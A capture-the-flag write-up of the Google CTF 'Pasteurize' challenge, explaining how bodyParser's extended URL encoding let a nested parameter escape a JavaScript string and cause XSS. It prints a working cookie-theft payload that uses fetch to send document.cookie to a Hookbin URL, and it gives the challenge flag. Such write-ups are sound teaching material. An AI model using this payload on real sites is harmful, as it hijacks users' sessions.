# Google CTF - Pasteurize

# Problem Description
This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?

https://pasteurize.web.ctfcompetition.com/

# Solution
I began this problem by writing some HTML tags in the input box. I wrote:

```HTML
<h1>Test</h1>
<button onclick="alert();">Click Me</button>
```

Both the h1 and button were reflected on the page. However, the button did not have any functionality. Upon checking the source code, I discovered that my input was processed and sanitized by the following script:

```js
const note = "\x3Ch1\x3Etest\x3C/h1\x3E\r\n\x3Cbutton onclick=\"alert();\"\x3Eclick me\x3C/button\x3E";
        const note_id = "e5893222-6704-48ce-83d9-1645b6eacb0f";
        const note_el = document.getElementById('note-content');
        const note_url_el = document.getElementById('note-title');
        const clean = DOMPurify.sanitize(note);
        note_el.innerHTML = clean;
        note_url_el.href = `/${note_id}`;
        note_url_el.innerHTML = `${note_id}`;
```

DOMPurify is a JavaScript library that allows client-side output sanitization to prevent XSS. So, I decided to try a method other than bypassing DOMPurify. 

Above the sanitization script, there was a comment that said: `<!-- TODO: Fix b/1337 in /source that could lead to XSS -->`

Thus, I navigated to `/source` and found server-side code written in NodeJS. 

At this point, I took a break from analyzing code and moved to analyzing requests in Burp Suite. I, once again, created a new paste. This time, I inputted `SPICYSTRINGDATA`

The data was reflected in a variable called `content:`. So, I modified the request with an XSS payload and navigated to the location of the request (found in `Location:` in the repeater). The payload I used is listed below:

```js
// Payload format 
content[key] = value

// Payload
content[-alert(1)-]=-1-
```

The payload triggered an alert. This indicated that the site is vulnerable to XSS. Upon analyzing the source, I found my payload reflected as such:

```js
const note = ""-alert(1)-":"-1-"";
```

This XSS payload worked because of a feature in bodyParser found in `/source`. The vulnerable code is listed below:

```js
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

In the bodyParser documentation, I learned that the `extended` option allows for rich objects and arrays to be encoded into the URL-encoded format. Basically, it allowed me to create a nested object within my query string by surrounding the name of sub-keys with square brackets [Source](https://www.npmjs.com/package/qs). 

At this point, I hit a wall and didn't know how to proceed. Then I remembered a feature for every paste called "share with TJMike." After more research, I decided to research payloads that would allow me to hijack TJMike's session cookie. I used two tools for the attempted hijacking: Burp Suite & Hookbin. 

*Note: I did not come up with this payload. I found it on LiveOverflow's YouTube Channel.*

To begin injecting, go to [Hookbin](https://hookbin.com) and generate a URL. 

Then use the following payload in Burp:

```js
content[-fetch('https://YOURHOOKBINURL?cookie='%2bdocument.cookie,{'mode':'no-cors'})-]=-1-
```

I then navigated to the location of the request, and sent the paste to TJMIke. I then spent 30 minutes trying to figure out why that payload wasn't working. *(Spoiler: it was)*

**REFRESH THE HOOKBIN PAGE. THE PAYLOAD ONLY WORKS IF YOU DO.**

Scroll down, and you'll find the flag. 

## Flag
```
CTF{Express_t0_Tr0ubl3s}
```

